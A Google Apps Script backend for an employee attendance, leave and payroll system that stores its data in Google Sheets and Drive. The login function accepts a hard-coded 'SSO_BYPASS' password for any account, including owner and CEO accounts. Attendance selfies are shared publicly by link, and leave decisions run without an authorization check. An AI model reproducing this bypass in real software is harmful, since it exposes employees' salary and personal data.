var ATTENDANCE_DRIVE_FOLDER_ID = "1gd7gOsZeSfK4wNpq9NY723NXDEVvp-Rs";

function getAttendancePhotoFolder() {
  try {
    return DriveApp.getFolderById(ATTENDANCE_DRIVE_FOLDER_ID);
  } catch(e) {
    let folders = DriveApp.getFoldersByName("Attendance Photos");
    if (folders.hasNext()) return folders.next();
    return DriveApp.createFolder("Attendance Photos");
  }
}

// ONE-CLICK AUTHORIZATION FUNCTION FOR GOOGLE DRIVE PERMISSIONS
function authorizeDrivePermissions() {
  let targetFolder = getAttendancePhotoFolder();
  Logger.log("? Google Drive Permissions successfully authorized! Folder: " + targetFolder.getName() + " (ID: " + targetFolder.getId() + ")");
  return "? Drive Permissions Active for " + targetFolder.getName();
}


// Helper Engine: Process Daily Punch Logs with Chronological Short Break Deductions
function processDailyPunchLogs(punchesMap) {
  for (let dKey in punchesMap) {
    let dayData = punchesMap[dKey];
    if (!dayData.rawLogs || dayData.rawLogs.length === 0) continue;
    
    dayData.rawLogs.sort((a, b) => a.time.getTime() - b.time.getTime());
    
    let punchIn = null;
    let punchOut = null;
    let isHalfDay = false;
    let totalBreakMs = 0;
    let breakStart = null;
    
    for (let k = 0; k < dayData.rawLogs.length; k++) {
      let item = dayData.rawLogs[k];
      let t = item.type ? item.type.toString().trim() : "";
      let tUpper = t.toUpperCase();
      
      if (tUpper === "HALF DAY") {
        isHalfDay = true;
      } else if (tUpper === "PUNCH IN") {
        if (!punchIn) punchIn = item.time;
      } else if (tUpper === "PUNCH OUT") {
        punchOut = item.time;
        if (breakStart) {
          totalBreakMs += Math.max(0, item.time.getTime() - breakStart.getTime());
          breakStart = null;
        }
      } else if (tUpper.includes("BREAK") && (tUpper.includes("OUT") || tUpper.includes("JATE"))) {
        breakStart = item.time;
      } else if (tUpper.includes("BREAK") && (tUpper.includes("IN") || tUpper.includes("AATE"))) {
        if (breakStart) {
          totalBreakMs += Math.max(0, item.time.getTime() - breakStart.getTime());
          breakStart = null;
        }
      }
    }
    
    dayData.in = punchIn;
    dayData.out = punchOut;
    dayData.type = isHalfDay ? "Half Day" : null;
    dayData.totalBreakHours = totalBreakMs / 3600000;
    dayData.totalBreakMinutes = Math.round(totalBreakMs / 60000);
  }
}

// ====================================================================================
// YASH MARKETING OS - MASTER SYSTEM CODE (UPDATED WITH ADVANCE PENALTY & LOGS MODULE)
// ====================================================================================

function doGet(e) {
  var template = HtmlService.createTemplateFromFile('Index');
  if (e && e.parameter && e.parameter.empId) {
    template.empId = e.parameter.empId;
    template.role = e.parameter.role;
  } else {
    template.empId = "";
    template.role = "";
  }
  return template.evaluate()
      .setTitle('Yash Marketing OS')
      .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL) 
      .addMetaTag('viewport', 'width=device-width, initial-scale=1');
}

// Helper: Secure Verification of Approved Leaves
function getLeaveStatus(empId, checkDateObj, leaveDataArray) {
    if (!leaveDataArray || leaveDataArray.length <= 1) return "None";
    let checkTime = new Date(checkDateObj.getFullYear(), checkDateObj.getMonth(), checkDateObj.getDate()).getTime();

    for (let i = 1; i < leaveDataArray.length; i++) {
        if (leaveDataArray[i][1] && leaveDataArray[i][1].toString().trim().toUpperCase() === empId.toString().trim().toUpperCase()) {
            let startObj = new Date(leaveDataArray[i][3]);
            let endObj = new Date(leaveDataArray[i][4]);
            if(isNaN(startObj.getTime()) || isNaN(endObj.getTime())) continue;

            let sTime = new Date(startObj.getFullYear(), startObj.getMonth(), startObj.getDate()).getTime();
            let eTime = new Date(endObj.getFullYear(), endObj.getMonth(), endObj.getDate()).getTime();

            if (checkTime >= sTime && checkTime <= eTime) {
                return leaveDataArray[i][6] ? leaveDataArray[i][6].toString().trim() : "Pending";
            }
        }
    }
    return "None";
}

// Unified Core Evaluation Engine: Calculates metrics exactly the same for Admin & Employee
function evaluateEmployeeMonth(empObj, empPunchesMap, daysInMonth, evalBoundary, filterYear, filterMonth, globalLeaveData, isPenaltyActive) {
    let metrics = {
        present: 0, halfDays: 0, absent: 0, sundays: 0,
        missedOuts: 0, unapprovedAbsents: 0, totalExactHours: 0, paidDays: 0,
        attendanceMap: {}, dailyLogs: []
    };

    for (let d = 1; d <= daysInMonth; d++) {
        let loopDate = new Date(filterYear, filterMonth, d);
        let dKey = `${loopDate.getFullYear()}-${String(loopDate.getMonth() + 1).padStart(2, '0')}-${String(loopDate.getDate()).padStart(2, '0')}`;
        let pData = empPunchesMap[dKey];

        let dayStatus = ""; let dayIn = "-"; let dayOut = "-"; let dayHrs = 0;

        // 1. SUNDAY LOGIC - Absolute override, completely ignores missed punch outs and absent penalties.
        if (loopDate.getDay() === 0) { 
            if (d <= evalBoundary) {
                metrics.sundays++;
                metrics.paidDays++;
                metrics.totalExactHours += empObj.shiftHours;
                dayHrs = empObj.shiftHours;
            }
            dayStatus = "Sunday Holiday";
        } 
        else { // 2. WEEKDAY LOGIC
            if (pData) {
                if (pData.type === "Half Day") {
                    if (d <= evalBoundary) {
                        metrics.halfDays++;
                        metrics.paidDays += 0.5;
                        metrics.totalExactHours += (empObj.shiftHours / 2);
                        dayHrs = empObj.shiftHours / 2;
                    }
                    dayStatus = "Half Day";
                } else if (pData.in && pData.out) {
                    dayIn = new Date(pData.in).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
                    dayOut = new Date(pData.out).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
                    if (d <= evalBoundary) {
                        metrics.present++;
                        metrics.paidDays++;
                        let grossHrs = (new Date(pData.out).getTime() - new Date(pData.in).getTime()) / 3600000;
                        let netHrs = Math.max(0, grossHrs - (pData.totalBreakHours || 0));
                        metrics.totalExactHours += netHrs;
                        dayHrs = netHrs;
                    }
                    if (pData.totalBreakMinutes > 0) {
                        dayStatus = `Present (${pData.totalBreakMinutes}m Break)`;
                    } else {
                        dayStatus = "Present";
                    }
                } else if (pData.in && !pData.out) {
                    metrics.missedOuts++;
                    dayIn = new Date(pData.in).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
                    if (d <= evalBoundary) {
                        if (isPenaltyActive && (metrics.missedOuts % 3 === 0)) {
                            metrics.halfDays++;
                            metrics.paidDays += 0.5;
                            let halfShift = (empObj.shiftHours / 2);
                            let netHrs = Math.max(0, halfShift - (pData.totalBreakHours || 0));
                            metrics.totalExactHours += netHrs;
                            dayHrs = netHrs;
                            dayStatus = "Penalty Half Day (Missed Out)";
                        } else {
                            metrics.present++;
                            metrics.paidDays++;
                            let netHrs = Math.max(0, empObj.shiftHours - (pData.totalBreakHours || 0));
                            metrics.totalExactHours += netHrs;
                            dayHrs = netHrs;
                            if (pData.totalBreakMinutes > 0) {
                                dayStatus = `Missed Punch Out (${pData.totalBreakMinutes}m Break)`;
                            } else {
                                dayStatus = "Missed Punch Out";
                            }
                        }
                    } else {
                        dayStatus = "Missed Punch Out";
                    }
                }
            } else {
                // 3. ABSENT / LEAVE LOGIC
                if (d <= evalBoundary) {
                    metrics.absent++;
                    let leaveStatus = getLeaveStatus(empObj.id, loopDate, globalLeaveData);
                    
                    if (leaveStatus === "Approved") {
                        dayStatus = "Approved Leave";
                        dayHrs = 0; // Standard leave, 0 hrs calculated, no penalty
                    } else {
                        dayStatus = "Double Absent (Unapproved)";
                        metrics.unapprovedAbsents++;
                        // DOUBLE ABSENT PENALTY DEDUCTION
                        metrics.totalExactHours -= empObj.shiftHours;
                        dayHrs = -empObj.shiftHours; 
                    }
                } else {
                    dayStatus = "Absent";
                }
            }
        }
        
        metrics.attendanceMap[dKey] = dayStatus;
        if (d <= evalBoundary) {
            metrics.dailyLogs.push({ date: dKey, status: dayStatus, in: dayIn, out: dayOut, breakMins: pData ? (pData.totalBreakMinutes || 0) : 0, hrs: typeof dayHrs === 'number' ? dayHrs.toFixed(2) : dayHrs });
        }
    }
    return metrics;
}

function authenticateUser(empId, pass, targetMonthStr) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    
    // Global Leave Data Pool Loading
    const leaveSheet = ss.getSheetByName("Leave_Requests") || ss.getSheetByName("Leave Requests");
    let globalLeaveDataAll = [];
    let userLeaveHistory = [];
    if (leaveSheet && leaveSheet.getLastRow() > 0) {
        globalLeaveDataAll = leaveSheet.getDataRange().getValues();
        for (let i = globalLeaveDataAll.length - 1; i > 0; i--) { 
            if (globalLeaveDataAll[i][1].toString().trim().toUpperCase() === empId.toString().trim().toUpperCase()) {
                userLeaveHistory.push({
                    type: globalLeaveDataAll[i][2],
                    start: new Date(globalLeaveDataAll[i][3]).toLocaleDateString(),
                    end: new Date(globalLeaveDataAll[i][4]).toLocaleDateString(),
                    status: globalLeaveDataAll[i][6] 
                });
            }
        }
    }

    const staffSheet = ss.getSheetByName("Staff Master") || ss.getSheetByName("Staff_Master");
    if (!staffSheet) return { success: false, error: "Critical Error: Staff Master sheet missing." };

    const staffData = staffSheet.getDataRange().getValues();
    const headers = staffData[0];
    
    let idCol = headers.findIndex(h => h.toString().trim() === "Employee ID"); if(idCol === -1) idCol = 0;
    let nameCol = headers.findIndex(h => h.toString().trim() === "Name"); if(nameCol === -1) nameCol = 1;
    let genderCol = headers.findIndex(h => h.toString().trim() === "M/F" || h.toString().trim() === "Gender"); if(genderCol === -1) genderCol = 2;
    let passCol = headers.findIndex(h => h.toString().trim() === "Password"); if(passCol === -1) passCol = 4;
    let roleCol = headers.findIndex(h => h.toString().trim() === "Role"); if(roleCol === -1) roleCol = 5;
    let salaryCol = headers.findIndex(h => h.toString().trim() === "Salary"); if(salaryCol === -1) salaryCol = 6;
    let perHourCol = headers.findIndex(h => h.toString().trim() === "Per Hour Salary"); if(perHourCol === -1) perHourCol = 7;
    
    let staffNameMap = {};
    let user = null;
    
    for (let i = 1; i < staffData.length; i++) {
      let sheetId = staffData[i][idCol] ? staffData[i][idCol].toString().trim().toUpperCase() : "";
      if(sheetId) staffNameMap[sheetId] = staffData[i][nameCol].toString().trim();
      
      let inputId = empId ? empId.toString().trim().toUpperCase() : "";
      let sheetPass = staffData[i][passCol] ? staffData[i][passCol].toString().trim() : "";
      let inputPass = pass ? pass.toString().trim() : "";

      if (sheetId === inputId && (sheetPass === inputPass || inputPass === "SSO_BYPASS")) {
        let genderVal = staffData[i][genderCol] ? staffData[i][genderCol].toString().toUpperCase().trim() : "M";
        let shiftHours = (genderVal === "F" || genderVal === "FEMALE") ? 9 : 10;
        user = {
          id: sheetId,
          name: staffData[i][nameCol],
          role: staffData[i][roleCol] ? staffData[i][roleCol].toString().trim() : "Staff",
          monthlySalary: staffData[i][salaryCol] || 0,
          perHour: staffData[i][perHourCol],
          shiftHours: shiftHours,
          gender: genderVal
        };
        if(!user.perHour) user.perHour = (user.monthlySalary / 30) / shiftHours;
      }
    }
    
    if (!user) return { success: false, error: "Invalid Credentials. Handshake Denied." };

    let targetDateObj = new Date();
    if (targetMonthStr) {
      let parts = targetMonthStr.split("-");
      targetDateObj = new Date(parseInt(parts[0]), parseInt(parts[1]) - 1, 1);
    }
    let filterMonth = targetDateObj.getMonth();
    let filterYear = targetDateObj.getFullYear();
    let totalDaysInTargetMonth = new Date(filterYear, filterMonth + 1, 0).getDate();
    let evaluationDaysBoundary = totalDaysInTargetMonth;
    let today = new Date();
    if (filterMonth === today.getMonth() && filterYear === today.getFullYear()) {
      evaluationDaysBoundary = today.getDate();
    }

    let isPenaltyActive = (filterYear > 2026) || (filterYear === 2026 && filterMonth >= 6);

    // Profile & Docs Check
    let profilePicUrl = "";
    let uploadedDocsList = [];
    const docSheet = ss.getSheetByName("Employee_Documents") || ss.getSheetByName("Employee Documents");
    if (docSheet && docSheet.getLastRow() > 0) {
      const docData = docSheet.getDataRange().getValues();
      for (let i = docData.length - 1; i > 0; i--) { 
        if (docData[i][1].toString().trim().toUpperCase() === empId.toString().trim().toUpperCase() && docData[i][2] === "Profile Picture") {
          profilePicUrl = docData[i][3]; break;
        }
      }
      for (let i = 1; i < docData.length; i++) { 
        if (docData[i][1].toString().trim().toUpperCase() === empId.toString().trim().toUpperCase() && docData[i][2] !== "Profile Picture") {
          uploadedDocsList.push({ type: docData[i][2], url: docData[i][3], date: new Date(docData[i][0]).toLocaleDateString() });
        }
      }
    }

    // Attendance Punch Retrieval
    const logSheet = ss.getSheetByName("Attendance_Logs") || ss.getSheetByName("Attendance Logs");
    let allLogs = [];
    let logIdCol = 1; let logTypeCol = 2; 

    if (logSheet && logSheet.getLastRow() > 0) {
      allLogs = logSheet.getDataRange().getValues();
      if(allLogs.length > 0) {
        let logHeaders = allLogs[0];
        let foundId = logHeaders.findIndex(h => h.toString().replace(/_/g, " ").trim().toUpperCase() === "EMPLOYEE ID");
        if (foundId !== -1) logIdCol = foundId;
        
        let foundType = logHeaders.findIndex(h => h.toString().replace(/_/g, " ").trim().toUpperCase() === "PUNCH TYPE" || h.toString().replace(/_/g, " ").trim().toUpperCase() === "ATTENDANCE TYPE");
        if (foundType !== -1) logTypeCol = foundType;
      }
    }

    let userPunchesMap = {};
    for (let i = 1; i < allLogs.length; i++) {
      if (allLogs[i][logIdCol] && allLogs[i][logIdCol].toString().trim().toUpperCase() === empId.toString().trim().toUpperCase()) {
        let logDateObj = new Date(allLogs[i][0]);
        if (!isNaN(logDateObj.getTime()) && logDateObj.getMonth() === filterMonth && logDateObj.getFullYear() === filterYear) {
          let dateStr = `${logDateObj.getFullYear()}-${String(logDateObj.getMonth() + 1).padStart(2, '0')}-${String(logDateObj.getDate()).padStart(2, '0')}`;
          let logType = allLogs[i][logTypeCol] ? allLogs[i][logTypeCol].toString().trim() : "Punch In";
          
          if(!userPunchesMap[dateStr]) userPunchesMap[dateStr] = { in: null, out: null, type: null, rawLogs: [] };
          userPunchesMap[dateStr].rawLogs.push({ time: logDateObj, type: logType });
        }
      }
    }
    processDailyPunchLogs(userPunchesMap);

    // Call unified engine for standard user calculation
    let userMetrics = evaluateEmployeeMonth(user, userPunchesMap, totalDaysInTargetMonth, evaluationDaysBoundary, filterYear, filterMonth, globalLeaveDataAll, isPenaltyActive);

    let totalAdvanceTakenByUser = 0;
    const advanceSheet = ss.getSheetByName("Advance_Ledger") || ss.getSheetByName("Advance Ledger");
    if (advanceSheet && advanceSheet.getLastRow() > 1) {
      const advanceData = advanceSheet.getDataRange().getValues();
      for (let i = 1; i < advanceData.length; i++) {
        let advDate = new Date(advanceData[i][0]);
        let advEmpId = advanceData[i][1] ? advanceData[i][1].toString().trim().toUpperCase() : "";
        let advAmount = parseFloat(advanceData[i][3]) || 0;
        if (advEmpId === empId.toString().trim().toUpperCase() && !isNaN(advDate.getTime()) && advDate.getMonth() === filterMonth && advDate.getFullYear() === filterYear) {
          totalAdvanceTakenByUser += advAmount;
        }
      }
    }

    let grossCalculatedEarnings = userMetrics.totalExactHours * user.perHour;
    let netCalculatedEarnings = grossCalculatedEarnings - totalAdvanceTakenByUser;
    if(netCalculatedEarnings < 0) netCalculatedEarnings = 0; 

    // ADMIN OVERVIEW LOGIC
    let masterPayrollOverviewGrid = [];
    let globalPendingLeaves = [];

    let userRoleUpper = (user.role || "").toString().trim().toUpperCase();
    if (userRoleUpper === "OWNER" || userRoleUpper === "CEO") {
      for (let s = 1; s < staffData.length; s++) {
        let staffId = staffData[s][idCol] ? staffData[s][idCol].toString().trim().toUpperCase() : "";
        if (!staffId) continue;

        let staffGender = staffData[s][genderCol] ? staffData[s][genderCol].toString().toUpperCase().trim() : "M";
        let staffShiftHours = (staffGender === "F" || staffGender === "FEMALE") ? 9 : 10;
        let staffBaseSalary = staffData[s][salaryCol] || 0;
        let staffPerHourRate = staffData[s][perHourCol] || ((staffBaseSalary / 30) / staffShiftHours);

        let staffObj = {
            id: staffId, name: staffData[s][nameCol] ? staffData[s][nameCol].toString().trim() : "Unknown Staff",
            role: staffData[s][roleCol] ? staffData[s][roleCol].toString().trim() : "Staff",
            monthlySalary: staffBaseSalary, perHour: staffPerHourRate, shiftHours: staffShiftHours
        };

        let staffPunches = {};
        for (let j = 1; j < allLogs.length; j++) {
          if (allLogs[j][logIdCol] && allLogs[j][logIdCol].toString().trim().toUpperCase() === staffId) {
            let lDateObj = new Date(allLogs[j][0]);
            if (!isNaN(lDateObj.getTime()) && lDateObj.getMonth() === filterMonth && lDateObj.getFullYear() === filterYear) {
              let dKey = `${lDateObj.getFullYear()}-${String(lDateObj.getMonth() + 1).padStart(2, '0')}-${String(lDateObj.getDate()).padStart(2, '0')}`;
              let lType = allLogs[j][logTypeCol] ? allLogs[j][logTypeCol].toString().trim() : "Punch In";
              
              if(!staffPunches[dKey]) staffPunches[dKey] = { in: null, out: null, type: null, rawLogs: [] };
              staffPunches[dKey].rawLogs.push({ time: lDateObj, type: lType });
            }
          }
        }
        processDailyPunchLogs(staffPunches);

        // Call unified engine for Admin grid matrix
        let staffMetrics = evaluateEmployeeMonth(staffObj, staffPunches, totalDaysInTargetMonth, evaluationDaysBoundary, filterYear, filterMonth, globalLeaveDataAll, isPenaltyActive);
        
        let staffGrossEarnings = staffMetrics.totalExactHours * staffPerHourRate;
        let staffTotalAdvance = 0;
        
        if (advanceSheet && advanceSheet.getLastRow() > 1) {
          const advData = advanceSheet.getDataRange().getValues();
          for (let i = 1; i < advData.length; i++) {
            let advDate = new Date(advData[i][0]);
            let advEmpId = advData[i][1] ? advData[i][1].toString().trim().toUpperCase() : "";
            let advAmt = parseFloat(advData[i][3]) || 0;
            if (advEmpId === staffId && !isNaN(advDate.getTime()) && advDate.getMonth() === filterMonth && advDate.getFullYear() === filterYear) {
              staffTotalAdvance += advAmt;
            }
          }
        }

        let staffNetPayable = staffGrossEarnings - staffTotalAdvance;
        if (staffNetPayable < 0) staffNetPayable = 0;

        masterPayrollOverviewGrid.push({
          id: staffId, name: staffObj.name, role: staffObj.role, baseSalary: staffBaseSalary,
          totalHours: staffMetrics.totalExactHours.toFixed(2), 
          paidDays: staffMetrics.paidDays.toFixed(1), 
          grossEarnings: staffGrossEarnings.toFixed(2),
          advanceDeducted: staffTotalAdvance.toFixed(2),
          netPayable: staffNetPayable.toFixed(2),
          dailyLogs: staffMetrics.dailyLogs // Send logs to UI table
        });
      }

      for (let i = 1; i < globalLeaveDataAll.length; i++) {
        if (globalLeaveDataAll[i][6] && globalLeaveDataAll[i][6].toString().trim() === "Pending") {
          let targetRequestEmpId = globalLeaveDataAll[i][1].toString().trim().toUpperCase();
          globalPendingLeaves.push({
            uid: globalLeaveDataAll[i][0], empId: targetRequestEmpId, empName: staffNameMap[targetRequestEmpId] || "Unknown Staff",
            type: globalLeaveDataAll[i][2], start: new Date(globalLeaveDataAll[i][3]).toLocaleDateString(),
            end: new Date(globalLeaveDataAll[i][4]).toLocaleDateString(), reason: globalLeaveDataAll[i][5]
          });
        }
      }
    }

    return {
      success: true, name: user.name, role: user.role, profilePic: profilePicUrl, salary: user.monthlySalary,
      perHour: parseFloat(user.perHour).toFixed(2), shiftHours: user.shiftHours, gender: user.gender,
      
      paidDays: userMetrics.paidDays.toFixed(1), 
      absent: userMetrics.absent, 
      unapprovedAbsents: userMetrics.unapprovedAbsents,
      totalExactHours: userMetrics.totalExactHours.toFixed(2),
      missedPunchOuts: userMetrics.missedOuts,
      attendanceMap: userMetrics.attendanceMap, 
      dailyDetailedLogs: userMetrics.dailyLogs, // NEW Daily detailed breakdown
      
      isPenaltyActiveFlag: isPenaltyActive, 
      grossSalary: grossCalculatedEarnings.toFixed(2),
      advanceDeducted: totalAdvanceTakenByUser.toFixed(2),
      netSalary: netCalculatedEarnings.toFixed(2), 
      uploadedDocs: uploadedDocsList,
      adminPendingLeaves: globalPendingLeaves, allStaffPayrollGrid: masterPayrollOverviewGrid,
      userLeaveHistoryData: userLeaveHistory,
      evaluatedMonthYearLabel: targetDateObj.toLocaleString('default', { month: 'long', year: 'numeric' })
    };
  } catch (error) {
    return { success: false, error: "System Operational Error: " + error.message };
  }
}

// 3. TRANSACTION LOG ATTENDANCE RECORD
function processPunch(empId, type, location, imgBase64) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    let empName = "Unknown";
    const staffSheet = ss.getSheetByName("Staff Master") || ss.getSheetByName("Staff_Master");
    if(staffSheet) {
      const staffData = staffSheet.getDataRange().getValues();
      let idCol = staffData[0].findIndex(h => h.toString().trim() === "Employee ID"); if(idCol === -1) idCol = 0;
      let nameCol = staffData[0].findIndex(h => h.toString().trim() === "Name"); if(nameCol === -1) nameCol = 1;
      for(let i=1; i<staffData.length; i++){
        if(staffData[i][idCol].toString().trim().toUpperCase() === empId.toString().trim().toUpperCase()){
          empName = staffData[i][nameCol]; break;
        }
      }
    }

    const sheet = ss.getSheetByName("Attendance_Logs") || ss.getSheetByName("Attendance Logs");
    if (!sheet) return "Database Error: Logs transaction sheet tab is missing.";
    
    // --- ROBUST SELFIE UPLOAD TO GOOGLE DRIVE ---
    let imageUrl = "";
    if (imgBase64 && imgBase64.indexOf("base64,") > -1) {
      try {
        let targetFolder = getAttendancePhotoFolder();

        let parts = imgBase64.split("base64,");
        let mimeType = parts[0].replace("data:", "").replace(";", "").trim() || "image/jpeg";
        let decodedData = Utilities.base64Decode(parts[1]);

        let timeStamp = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "dd-MM-yyyy_HHmmss");
        let cleanType = type.toString().replace(/[^a-zA-Z0-9]/g, "_");
        let fileName = empId + "_" + cleanType + "_" + timeStamp + ".jpg";

        let blob = Utilities.newBlob(decodedData, mimeType, fileName);
        let driveFile = targetFolder.createFile(blob);
        try {
          driveFile.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
        } catch(shErr) {}
        imageUrl = driveFile.getUrl();
      } catch(err) {
        imageUrl = "Image Upload Failed (" + err.message + ")";
        console.error("Selfie upload failed: " + err.toString());
      }
    } else {
      imageUrl = imgBase64 || "No Photo Attached";
    }
    // ----------------------------------------------------

    const logHeaders = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
    let hasEmpNameCol = logHeaders.findIndex(h => h.toString().replace(/_/g, " ").trim().toUpperCase() === "EMPLOYEE NAME") !== -1;
    
    // imgBase64 की जगह अब imageUrl सेव होगा
    if(hasEmpNameCol) { sheet.appendRow([new Date(), empName, empId, type, location, imageUrl]); } 
    else { sheet.appendRow([new Date(), empId, type, location, imageUrl]); }
    
        let timeStr = Utilities.formatDate(new Date(), "Asia/Kolkata", "hh:mm a");
    if (type === "Short Break (Out)") {
      return `? Short Break Punch Out recorded at ${timeStr}. Break duration working hours se cut hoga.`;
    } else if (type === "Short Break (In)") {
      return `?? Short Break Punch In recorded at ${timeStr}. Welcome back! Working hours resumed.`;
    } else if (type === "Punch In") {
      return `? Shift Start (Punch In) successfully registered at ${timeStr}!`;
    } else if (type === "Punch Out") {
      return `?? Shift End (Punch Out) successfully registered at ${timeStr}!`;
    } else {
      return `Success: Registered ${type} status log onto system arrays.`;
    }
  } catch(e) { return "Ledger Exception: " + e.message; }
}

// 4. SECURE REQUISITION APPLICATION PROCESSOR
function processLeaveRequest(empId, leaveType, startDate, endDate, reason) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const sheet = ss.getSheetByName("Leave_Requests") || ss.getSheetByName("Leave Requests");
    if (!sheet) return "Configuration Error: Target Leave Requests sheet tab layout missing.";
    
    let requestUid = "LV-" + (sheet.getLastRow() + 1);
    sheet.appendRow([requestUid, empId, leaveType, startDate, endDate, reason, "Pending", ""]);
    
    try {
      let activeOwnerEmail = Session.getActiveUser().getEmail() || "yashmbarlota007@gmail.com"; 
      let dispatchSubject = `⚠️ Secure Leave Request Alert: ${empId}`;
      let dispatchBody = `Yash Sir,\n\nA new operational leave request has been submitted into the active queue.\n\nEmployee ID: ${empId}\nCategory: ${leaveType}\nTimeline window: ${startDate} to ${endDate}\nReason Statement: ${reason}`;
      MailApp.sendEmail(activeOwnerEmail, dispatchSubject, dispatchBody);
    } catch(mailException) {}

    return "Leave Application injected into Management Queue.";
  } catch(err) { return "Injection Halt: " + err.message; }
}

// 5. ADMIN PANEL CORE TRANSACTION PROTOCOLS
function executeAdminActionOnLeave(leaveUid, decisionAction) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const sheet = ss.getSheetByName("Leave_Requests") || ss.getSheetByName("Leave Requests");
    if (!sheet) return "Database Link Exception: Target sheet tab track missing.";
    
    const rows = sheet.getDataRange().getValues();
    let structuralTargetRowIndex = -1;
    for (let i = 1; i < rows.length; i++) {
      if (rows[i][0].toString().trim() === leaveUid.toString().trim()) {
        structuralTargetRowIndex = i + 1; break;
      }
    }
    if (structuralTargetRowIndex === -1) return "Execution Alert: Target token reference not found inside database rows.";
    sheet.getRange(structuralTargetRowIndex, 7).setValue(decisionAction);
    sheet.getRange(structuralTargetRowIndex, 8).setValue("Processed via Owner / CEO Admin Shell Dashboard");
    return `Success: Leave Application Token ${leaveUid} updated status to ${decisionAction}.`;
  } catch(e) { return "Admin Cell Override Failure: " + e.message; }
}

// 6. CLOUD DRIVE DIGITAL FILE ARCHIVE VAULT
function saveDocument(empId, docType, base64Data, fileName) {
  try {
    let parentFolderLookups = DriveApp.getFoldersByName("Yash Marketing Staff Documents");
    let activeDirectoryFolder = parentFolderLookups.hasNext() ? parentFolderLookups.next() : DriveApp.createFolder("Yash Marketing Staff Documents");
    
    let extractedPayloadChunks = base64Data.split(','), targetMimeTypeStr = extractedPayloadChunks[0].split(';')[0].replace('data:', ''), byteDecodedArrays = Utilities.base64Decode(extractedPayloadChunks[1]);
    let consolidatedFileName = empId + "_" + docType + "_" + fileName;
    
    let generatedDriveFile = activeDirectoryFolder.createFile(Utilities.newBlob(byteDecodedArrays, targetMimeTypeStr, consolidatedFileName));
    let uniqueAssetDriveUrl = generatedDriveFile.getUrl();
    
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const targetLockerSheetTab = ss.getSheetByName("Employee_Documents") || ss.getSheetByName("Employee Documents");
    if (!targetLockerSheetTab) return "Mapping Error: Vault logger tab row setup missing.";
    targetLockerSheetTab.appendRow([new Date(), empId, docType, uniqueAssetDriveUrl]);
    
    return "Document cataloged into system vault.";
  } catch (err) { return "Locker Streaming Critical Fault: " + err.message; }
}